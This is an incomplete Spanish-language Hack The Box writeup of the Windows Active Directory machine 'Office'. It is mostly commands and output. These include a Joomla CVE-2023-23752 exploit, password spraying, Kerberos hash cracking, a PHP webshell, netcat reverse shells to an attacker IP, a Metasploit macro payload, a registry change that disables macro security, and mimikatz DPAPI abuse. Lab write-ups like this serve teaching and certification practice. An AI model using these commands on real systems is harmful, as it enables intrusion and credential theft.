---
tags:
  - type/writeup
  - asset/active-directory
  - env/windows
  - estado/incompleto
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/588
dificultad: Dificil
ip: 10.10.11.3
os: Windows
relacionados:
---
# HackTheBox - Office

## Reconocimiento

### Nmap

Comencé lanzando un escaneo `nmap` para descubrir todos los puertos abiertos y luego ejecuté un escaneo más detallado sobre los puertos encontrados para identificar servicios y versiones.

Bash

```
ports=$(nmap -p- --min-rate=1000 -T4 10.129.230.226 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sC -sV 10.129.230.226
```

Los resultados del escaneo fueron muy informativos:

Plaintext

```
Nmap scan report for 10.129.230.226
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-generator: Joomla! - Open Source Content Management
|_http-title: Home
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-11 18:42:46Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

El escaneo reveló un entorno de **Active Directory** con el dominio `office.htb` y el controlador de dominio `DC.office.htb`. También identifiqué un servidor web Apache en el puerto 80 ejecutando **Joomla!**.

Procedí a añadir estas entradas a mi archivo `/etc/hosts`:

Bash

```
echo 10.129.230.226 office.htb dc.office.htb | sudo tee -a /etc/hosts
```

### HTTP (Puerto 80)

Al visitar `http://office.htb`, encontré una página de Joomla. Confirmé la tecnología inspeccionando el código fuente:

HTML

```
<meta name="generator" content="Joomla! - Open Source Content Management">
```

Una búsqueda rápida de vulnerabilidades recientes me llevó al **CVE-2023-23752**. Se trata de una vulnerabilidad de divulgación de información no autenticada que afecta a los _endpoints_ de la API de servicios web de Joomla, permitiendo el acceso a información sensible, como la configuración del sitio.

Para explotarla, simplemente lancé una petición `curl` al _endpoint_ vulnerable:

Bash

```
curl -v http://office.htb/api/index.php/v1/config/application?public=true
```

La respuesta JSON fue un éxito, revelando la configuración completa, incluyendo las credenciales de la base de datos:

JSON

```
...
{"type":"application","id":"224","attributes":{"dbtype":"mysqli","id":224}},
{"type":"application","id":"224","attributes":{"host":"localhost","id":224}},
{"type":"application","id":"224","attributes":{"user":"root","id":224}},
{"type":"application","id":"224","attributes":{"password":"H0lOgrams4reTakIng0Ver754!","id":224}},
{"type":"application","id":"224","attributes":{"db":"joomla_db","id":224}},
...
```

Obtuve la contraseña de la base de datos: `H0lOgrams4reTakIng0Ver754!`. Intenté usarla para acceder al panel de administrador de Joomla, pero falló. Estas credenciales eran solo para la base de datos MySQL, que no estaba expuesta.

### Kerberos y Enumeración de Usuarios

Dado que tenía una contraseña y un entorno de Active Directory (con el puerto 88 abierto), el siguiente paso fue enumerar usuarios válidos. Usé `kerbrute` para realizar una enumeración de usuarios contra el KDC.

Bash

```
kerbrute userenum -d office.htb --dc dc.office.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

Plaintext

```
...
2024/06/11 12:38:32 > [+] VALID USERNAME: administrator@office.htb
2024/06/11 12:40:04 > [+] VALID USERNAME: ewhite@office.htb
2024/06/11 12:40:04 > [+] VALID USERNAME: etower@office.htb
2024/06/11 12:40:05 > [+] VALID USERNAME: dwolfe@office.htb
2024/06/11 12:40:05 > [+] VALID USERNAME: dmichael@office.htb
2024/06/11 12:40:05 > [+] VALID USERNAME: dlanor@office.htb
...
```

Guardé los nombres de usuario válidos en un archivo `users.txt`. Luego, realicé un ataque de _password spraying_ usando `nxc` (NetExec) y la contraseña que encontré en la configuración de Joomla.

Bash

```
nxc smb office.htb -u users.txt -p 'H0lOgrams4reTakIng0Ver754!' --continue-on-success
```

Plaintext

```
SMB 10.129.230.226 445 DC [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB 10.129.230.226 445 DC [-] office.htb\ewhite:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
SMB 10.129.230.226 445 DC [-] office.htb\etower:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
SMB 10.129.230.226 445 DC [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 
SMB 10.129.230.226 445 DC [-] office.htb\dmichael:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
SMB 10.129.230.226 445 DC [-] office.htb\dlanor:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
```

¡Bingo! La contraseña `H0lOgrams4reTakIng0Ver754!` era válida para el usuario `dwolfe`.

### SMB y Análisis PCAP

Con credenciales válidas (`dwolfe`), usé `nxc` nuevamente para enumerar los recursos compartidos SMB a los que `dwolfe` tenía acceso.

Bash

```
nxc smb office.htb -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' --shares
```

Plaintext

```
...
SMB 10.129.230.226 445 DC Share        Permissions  Remark
SMB 10.129.230.226 445 DC -----       -----------  ------
SMB 10.129.230.226 445 DC ADMIN$                   Remote Admin
SMB 10.129.230.226 445 DC C$                       Default share
SMB 10.129.230.226 445 DC IPC$        READ         Remote IPC
SMB 10.129.230.226 445 DC NETLOGON    READ         Logon server share
SMB 10.129.230.226 445 DC SOC Analysis READ
SMB 10.129.230.226 445 DC SYSVOL      READ         Logon server share
```

El recurso `SOC Analysis` parecía prometedor. Me conecté usando `smbclient` y descargué el archivo `.pcap` que encontré.

Bash

```
smbclient "//office.htb/SOC Analysis" -U 'office/dwolfe%H0lOgrams4reTakIng0Ver754!'
smb: \> ls
  .                                   D        0  Wed May 10 19:52:24 2023
  ..                                 DHS        0  Wed Feb 14 10:18:31 2024
  Latest-System-Dump-8fbc124d.pcap      A  1372860  Mon May  8 01:59:00 2023
smb: \> get Latest-System-Dump-8fbc124d.pcap
```

Abrí el archivo PCAP en **Wireshark**. El tráfico era denso, así que apliqué un filtro para aislar protocolos de autenticación comunes:

`(tcp.port == 110 or tcp.port == 25 or tcp.port == 143 or udp.port == 161 or tcp.port == 21 or tcp.port == 80 or (ntlmssp) or (kerberos))`

Este filtro reveló un intercambio Kerberos para un usuario llamado `tstark`. Específicamente, encontré un paquete **AS-REQ**.

En un intercambio Kerberos estándar, el paquete AS-REQ contiene un _timestamp_ cifrado con el hash de la contraseña del usuario (esto es la preautenticación). Si podemos aislar este _hash_ de preautenticación, podemos intentar crackearlo _offline_.

Identifiqué el _hash_ de preautenticación (etype 18) en el segundo paquete AS-REQ y lo formateé para `Hashcat` (modo 19900).

Plaintext

```
$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
```

Lancé `hashcat` con la lista de contraseñas `rockyou.txt`.

Bash

```
hashcat -m 19900 hash.txt /usr/share/wordlists/rockyou.txt
```

Plaintext

```
...
$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc:playboy69
...
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 19900 (Kerberos 5, etype 18, Pre-Auth)
...
```

Obtuve la contraseña de `tstark`: `playboy69`.

---

## Explotación de vulnerabilidades

### Foothold (web_account)

Recordé que el _dump_ de la API de Joomla mostraba a "Tony Stark (Administrator)". Armado con la contraseña `playboy69`, navegué al panel de administración `/administrator` e intenté iniciar sesión como `tstark`.

Funcionó. Tenía acceso administrativo completo a Joomla.

Para obtener ejecución remota de comandos (RCE), navegué a `System` -> `Site Templates` -> `Cassiopeia Details and Files` y edité el archivo `index.php`.

Inyecté un _webshell_ PHP simple en la parte superior del archivo:

PHP

```
<?php system($_GET['cmd']); ?>
```

Confirmé el RCE usando `curl` para ejecutar `whoami`:

Bash

```
curl http://office.htb/index.php?cmd=whoami
```

Plaintext

```
office\web_account
```

Ahora necesitaba una _reverse shell_. Puse un servidor Python local para servir `nc64.exe` y un _listener_ `nc` para recibir la conexión.

Bash

```
# En mi máquina (Servidor web)
python3 -m http.server 80

# En mi máquina (Listener)
nc -lvvp 4444
```

Usé el _webshell_ para descargar `nc64.exe` a la máquina víctima y luego ejecutarlo:

Bash

```
# Descargar Netcat
curl http://office.htb/index.php?cmd=powershell+iwr+10.10.14.44/nc64.exe+-O+nc64.exe

# Ejecutar Reverse Shell
curl http://office.htb/index.php?cmd=nc64.exe+10.10.14.44+4444+-e+cmd.exe
```

Inmediatamente, recibí una conexión en mi _listener_ como el usuario de servicio `office\web_account`.

Plaintext

```
nc -lvvp 4444
Listening on 0.0.0.0 4444
Connection received on office.htb 56955
Microsoft Windows [Version 10.0.20348.2322]
(c) Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\joomla>whoami
office\web_account
```

---

## Escalada de privilegios

### Movimiento Lateral (tstark)

Ya tenía las credenciales para `tstark` (`playboy69`) gracias al análisis del PCAP. Para moverme lateralmente a este usuario, subí `RunasCs.exe` a la carpeta `c:\temp` (que creé).

Preparé un nuevo _listener_ `nc` en el puerto 4444 (después de detener el anterior) y usé `RunasCs.exe` desde mi _shell_ de `web_account` para ejecutar una nueva _reverse shell_ como `tstark`.

Bash

```
.\RunasCs.exe tstark playboy69 "C:\temp\nc64.exe -e cmd.exe 10.10.14.44 4444" -d office.htb -l 8
```

Recibí una nueva _shell_ como `office\tstark`, lo que me permitió leer la _user flag_ de su escritorio.

Plaintext

```
nc -lvvp 4444
Listening on 0.0.0.0 4444
Connection received on office.htb 63209
Microsoft Windows [Version 10.0.20348.2322]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
office\tstark
```

### Pivoteo (PPotts)

Desde mi _shell_ como `tstark`, ejecuté `netstat -ano` y descubrí un servicio web interno escuchando en `TCP 0.0.0.0:8083`.

Para acceder a este servicio, necesité pivotar. Usé **Chisel** para crear un túnel reverso.

Primero, inicié el servidor Chisel en mi máquina atacante:

Bash

```
./chisel server --reverse --port 8001
```

Luego, subí el binario `chisel.exe` a la máquina víctima y ejecuté el cliente para conectarme a mi servidor. Este comando reenvía el puerto `8083` de la máquina víctima a mi puerto `8083` local.

Bash

```
c:\temp> .\chisel.exe client 10.10.14.44:8001 R:8083:127.0.0.1:8083
```

Al visitar `http://127.0.0.1:8083` en mi navegador, encontré un portal interno para enviar solicitudes de trabajo. El formulario permitía subir un currículum, restringido a los tipos `DOC`, `DOCX`, `DOCM` y `ODT`.

Subí un archivo `test.odt` de prueba y observé que aparecía en `c:\xampp\htdocs\internal\applications`.

Revisé los permisos de esa carpeta:

Bash

```
c:\xampp\htdocs\internal> icacls applications
applications CREATOR OWNER:(OI)(CI)(IO)(F)
             OFFICE\PPotts:(OI)(CI)(NP)(F)
             ...
             OFFICE\web_account:(OI)(CI)(RX,W)
             ...
```

Esto fue revelador:

1. Mi _shell_ inicial (`web_account`) tenía permisos de escritura (`W`) en la carpeta.
    
2. Un usuario llamado `PPotts` tenía Control Total (`F`).
    

Después de unos minutos, mi archivo `test.odt` desapareció. Esto sugería que un proceso automatizado o el propio `PPotts` estaba monitoreando esta carpeta y abriendo los documentos.

Revisé `C:\Program Files` y confirmé que **LibreOffice** estaba instalado. El plan era claro: crear un archivo ODT con una macro maliciosa, subirlo como `web_account` y esperar a que `PPotts` lo abriera.

Usé Metasploit (`exploit/multi/misc/openoffice_document_macro`) para generar un `test.odt` con un _payload_ de _reverse shell_ (Meterpreter).

Bash

```
use exploit/multi/misc/openoffice_document_macro
set payload windows/x64/meterpreter/reverse_tcp
set srvhost 10.10.14.44
set filename test.odt
set lhost 10.10.14.44
set lport 4445
run
```

Subí el `test.odt` malicioso a la carpeta `applications` usando mi _shell_ de `web_account`. El archivo desapareció, pero no recibí ninguna conexión. La macro no se había ejecutado.

### Bypass de Seguridad de Macros (tstark)

Investigué por qué la macro de LibreOffice podía haber fallado y me centré en la configuración de seguridad del registro de Windows.

Desde mi _shell_ como `tstark`, consulté la clave de registro `MacroSecurityLevel`:

Bash

```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel"
```

Plaintext

```
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel
    Value    REG_DWORD    0x3
    Final    REG_DWORD    0x1
```

El valor `0x3` significa "Alto" (macros deshabilitadas). Mi ataque había fallado por esto.

Sin embargo, revisé los grupos a los que pertenecía `tstark`:

Bash

```
C:\Windows\system32> net user tstark
...
Global Group memberships *Domain Users     *Registry Editors
...
```

> [!TIP]
> 
> ¡tstark estaba en el grupo Registry Editors! Este grupo tiene privilegios para modificar claves del registro en HKEY_LOCAL_MACHINE (HKLM), lo que me permitía cambiar la política de seguridad de macros para toda la máquina.

Usando mi _shell_ de `tstark`, modifiqué el valor del registro a `0` (seguridad desactivada).

Bash

```
reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\LibreOffice\org.openoffice.Office.Common\Security\Scripting\MacroSecurityLevel" /v "Value" /t REG_DWORD /d 0 /f
```

La operación se completó con éxito.

### Shell como PPotts

Ahora, con la seguridad de macros desactivada, volví a mi _shell_ de `web_account` y subí _nuevamente_ el archivo `test.odt` malicioso generado por Metasploit a la carpeta `applications`.

Pocos segundos después...

Plaintext

```
[*] Sending stage (201798 bytes) to 10.129.230.226
[*] Meterpreter session 1 opened (10.10.14.44:4445 -> 10.129.230.226:59314) at 2024-06-12 15:40:53 +0100

msf6 exploit(multi/misc/openoffice_document_macro) > sessions -i 1
[*] Starting interaction with 1...
meterpreter > getuid
Server username: OFFICE\ppotts
```

Había obtenido una _shell_ como `OFFICE\ppotts`.

### Hacia HHogan (Abuso de DPAPI)

Migré a un proceso más estable y comencé a enumerar como `ppotts`. Ejecuté `cmdkey /list` para ver si había credenciales guardadas.

Bash

```
C:\Program Files\LibreOffice 5\program> cmdkey /list
Currently stored credentials:

    Target: LegacyGeneric:target=MyTarget
    Type: Generic
    User: MyUser

    Target: Domain:interactive=office\hhogan
    Type: Domain Password
    User: office\hhogan
```

¡Bingo! El sistema tenía credenciales guardadas para un usuario llamado `hhogan`. Sin embargo, un simple `runas /user:office\hhogan /savecred whoami` falló, pidiéndome la contraseña. El _flag_ `/savecred` solo funciona si la contraseña ya se ha introducido manualmente una vez en la sesión.

Estas credenciales estaban almacenadas en el perfil de `ppotts` como un _blob_ cifrado con **DPAPI** (Data Protection API). Para descifrarlas, necesitaba la contraseña de `ppotts` o su _Master Key_ de DPAPI.

No tenía la contraseña, pero podía abusar de un protocolo de Active Directory: **MS-BKRP** (Microsoft BackupKey Remote Protocol). Este protocolo permite a un usuario solicitar al Controlador de Dominio que descifre su propia _Master Key_ usando una clave de _backup_ del dominio.

Localicé los _blobs_ de credenciales y las _Master Keys_ en el perfil de `ppotts`.

- Credenciales: `C:\users\ppotts\appdata\roaming\microsoft\credentials\`
    
- Master Keys: `C:\users\ppotts\appdata\roaming\microsoft\protect\[SID]`
    

Identifiqué la _Master Key_ activa (`191d3f9d-7959-4b4d-a520-a444853c47eb`) basándome en la fecha del archivo `CREDHIST`.

Subí `mimikatz.exe` a `c:\temp`. Luego, desde mi Meterpreter, ejecuté `mimikatz` para solicitar el descifrado de la _Master Key_ al DC usando el protocolo RPC (MS-BKRP).

Bash

```
meterpreter > shell
C:\temp> .\mimikatz.exe
mimikatz # dpapi::masterkey /in:C:\users\ppotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc
```

Mimikatz contactó al Controlador de Dominio, y como yo era `ppotts` (el propietario legítimo de la clave), el DC la descifró y me la devolvió.

Plaintext

```
**MASTERKEYS**
...
[masterkey]
...
pbKey : ...
...
[backupkey]
**MASTERKEY**
...
pbKey : 21bf24763fbb1400010c08fccc5423fe...
...
[domainkey]
**DOMAINKEY**
...
```

Con la _Master Key_ descifrada en mi poder, el siguiente paso era usarla para descifrar el _blob_ de credenciales de `hhogan`.

---

## Vulnerabilidades y Conceptos Clave

Este _writeup_ cubrió una amplia gama de técnicas y vulnerabilidades:

- **Joomla CVE-2023-23752:** Explotación de una vulnerabilidad de divulgación de información no autenticada para obtener credenciales de base de datos.
    
- **Password Spraying:** Reutilización de la contraseña encontrada (de la BD de Joomla) contra usuarios de Active Directory enumerados con `kerbrute`.
    
- **Análisis de PCAP (Wireshark):** Aislamiento de tráfico Kerberos (AS-REQ) desde un archivo de captura de paquetes.
    
- **Crackeo de Kerberos (Hashcat):** Extracción y crackeo _offline_ de un _hash_ de preautenticación Kerberos (etype 18, modo 19900).
    
- **RCE en Joomla:** Obtención de una _shell_ web mediante la modificación de una plantilla de administrador.
    
- **Movimiento Lateral (`RunasCs`):** Uso de credenciales obtenidas para pivotar a otra cuenta de usuario en el sistema.
    
- **Port Forwarding (Chisel):** Creación de un túnel reverso para acceder a servicios web internos no expuestos.
    
- **Ataque de Macro (LibreOffice):** Explotación de la apertura de documentos ODT por parte de un usuario para ejecutar un _payload_.
    
- **Abuso de Privilegios de Grupo (Registry Editors):** Modificación de claves de registro críticas (`HKLM`) gracias a la pertenencia a un grupo privilegiado.
    
- **Bypass de Seguridad de Aplicación:** Desactivación de `MacroSecurityLevel` de LibreOffice modificando el registro para permitir la ejecución de la macro maliciosa.
    
- **Abuso de DPAPI y MS-BKRP:** Uso de `mimikatz` (`dpapi::masterkey /rpc`) para forzar al Controlador de Dominio a descifrar la _Master Key_ de DPAPI de un usuario.


## Bandera(s)

> [!FLAG] `flag{user}`
^bandera

> [!FLAG] `flag{root}`
^bandera